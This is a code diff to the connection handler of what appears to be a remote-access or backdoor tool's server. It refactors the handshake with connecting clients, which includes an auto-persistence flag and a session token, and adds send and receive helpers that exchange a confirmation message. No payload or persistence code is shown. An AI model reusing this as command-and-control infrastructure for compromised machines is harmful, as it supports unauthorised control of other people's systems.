@@ -2,9 +2,10 @@ import socket
 import threading
 import time
 import socket
-
+import os
+import binascii
 from .other import printColor
-from .other import generateToken
+
 
 class Handler(threading.Thread):
     #Manage incoming connections with a thread system
@@ -24,6 +25,7 @@ class Handler(threading.Thread):
         self.sock_server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         self.display = display
         self.auto_persistence = auto_persistence
+    
     def SuccessfullyQuit(self):
         try:
             print("\n")
@@ -37,7 +39,6 @@ class Handler(threading.Thread):
         
         self.sock_server.close()
         printColor("error","\r[-] Connexion server closed.")
-        
     
     def run(self):
         Handler.status_connection_display = self.display
@@ -83,59 +84,92 @@ The client first sends this information, then the server sends the parameters as
         self.conn = conn
         self.address = address
         self.auto_persistence = auto_persistence
+
+
+    def generateToken(self):
+        return binascii.hexlify(os.urandom(24)).decode("utf8")
+
+
+    def sendUltraSafe(self, data):
+        
+        try:
+            self.conn.send(data.encode())
+            print("[+] send: ",data)
+        except Exception as e:
+            print(e)
+        else:
+            try:
+                print("EN ATTENTE dans la reponse de ultrasafe")
+                self.conn.settimeout(3)
+                confirmation = self.conn.recv(4096).decode("utf8")
+            except Exception as e:
+                print("ERROR 2020",e)
+            else:
+                if(confirmation == "confirmation"):
+                    print("IN SENDULTRASAFE CONFIRMATION OK")
+                else:
+                    print("IN SENDULTRASAFE CONFIRMATION NOT OK")
+        
+        self.conn.settimeout(None)
+
+
+    def recvUltraSafe(self):
+        self.conn.settimeout(3)
+        try:
+            data = self.conn.recv(4096).decode("utf8")
+        except socket.timeout:
+            print("timeout in recvultrasafe")
+        except Exception:
+            print("error 2021")
+        else:   
+            try:
+                print("SEND confirmation in recvultrasafe.")
+                self.conn.send(b"confirmation")
+            except Exception:
+                print("EXCEPTION in recvULTRASAFE CONFIRMATION")
+ 
+        self.conn.settimeout(None)
+        return data
     
+
     def recvFirstInfo(self):
         #Collect informations with Handshake client.
         list_info = []
         while True:
-            self.conn.settimeout(3)
-            try:    
-                data = self.conn.recv(256).decode("latin1")
-                print(data)
-            except socket.timeout:
-                print("TIMEOUTTT")
-            else:
-                #print("persi>",data)
-                if data == "\r\n":
-                    break
-        
+            data = self.recvUltraSafe()
+            if(data == "\r\n"):
+                print("while stop")
+                break
+            print(data)
             tmp = data.split("|")
             list_info.append(tmp[1])
         
-        self.conn.settimeout(None)
         return list_info
-    
-    def sendParameterOfServer(self,token):
+
+
+    def sendParameterOfClient(self,token):
         if(self.auto_persistence):
-            self.conn.send(b"MOD_HANDSHAKE_AUTO_PERSISTENCE | True")
-            print("MOD_HANDSHAKE_AUTO_PERSISTENCE | True")
+            self.sendUltraSafe("MOD_HANDSHAKE_AUTO_PERSISTENCE | True")
+            #print(" SEND MOD_HANDSHAKE_AUTO_PERSISTENCE | True")
 
         else:
-            self.conn.send(b"MOD_HANDSHAKE_AUTO_PERSISTENCE | False")
-            print("MOD_HANDSHAKE_AUTO_PERSISTENCE | False")
+            self.sendUltraSafe("MOD_HANDSHAKE_AUTO_PERSISTENCE | False")
+            #print("SEND MOD_HANDSHAKE_AUTO_PERSISTENCE | False")
 
-        self.conn.send(b"MOD_HANDSHAKE_TOKEN | " + token.encode())        
-        
-        time.sleep(0.3)
-        self.conn.send(b"\r\n") #end echange.
-        
+        self.sendUltraSafe("MOD_HANDSHAKE_TOKEN | " + token)        
+        print("SEND TOKEN")
+        #time.sleep(0.3)
+        self.sendUltraSafe("\r\n") #end echange.
+        print("FINISH")
+
 
     def run(self):
         
-        token = generateToken()
-        for key in Handler.dict_conn.keys():
-            if Handler.dict_conn[key][7]:
-                print("double key")
-                token = generateToken()
-            else:
-                print("KEY IS GOOD !!")
-    
+        token = self.generateToken()
         list_info = self.recvFirstInfo() #Collect informations with Handshake client. #1
        # print("sencode part persi go !!!! ")
-        self.sendParameterOfServer(token) #2
+        self.sendParameterOfClient(token) #2
 
         
-        #print(list_info)
         Handler.dict_conn[Handler.number_conn] = [self.conn, self.address[0],self.address[1], True, list_info[0], list_info[1], list_info[2]] #3 #True = Connexion is life 
-        #print(Handler.dict_conn)
         Handler.number_conn+=1 #4
